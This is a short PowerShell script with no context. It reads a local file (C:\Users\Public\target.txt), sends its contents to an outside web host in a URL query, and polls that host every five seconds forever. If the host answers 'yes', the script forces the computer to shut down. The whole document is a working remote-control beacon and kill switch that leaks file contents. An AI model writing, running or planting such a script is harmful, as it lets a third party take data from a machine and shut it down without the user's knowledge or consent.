$s = Get-Content "C:\Users\Public\target.txt"

$url = "https://notbad123.deno.dev?name=$s"

while ($true) {
    $res = Invoke-WebRequest -Uri $url -Method Get
    if ($res.Content -eq "yes") {
        Stop-Computer -Force
    }
    Start-Sleep -Seconds 5
}
